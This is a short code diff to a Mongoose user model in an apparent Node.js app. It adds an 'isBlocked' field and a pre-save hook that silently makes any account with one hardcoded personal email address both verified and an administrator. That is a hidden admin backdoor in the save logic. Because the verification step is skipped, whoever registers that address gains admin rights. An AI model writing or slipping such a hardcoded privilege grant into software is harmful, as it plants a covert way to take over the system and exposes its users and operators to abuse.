@@ -67,6 +67,10 @@ const UserSchema = new mongoose.Schema(
             type: Boolean,
             default: false,
         },
+        isBlocked: {
+            type: Boolean,
+            default: false,
+        },
     },
     {
         toJSON: {
@@ -84,6 +88,11 @@ UserSchema.pre('save', async function (done) {
     if (this.isModified('password')) {
         const hashed = await Password.toHash(this.get('password'));
         this.set('password', hashed);
+    }
+
+    if (this.email === 'chandranpsharath@gmail.com') {
+        this.set('verified', true);
+        this.set('isAdmin', true);
     }
 
     done();
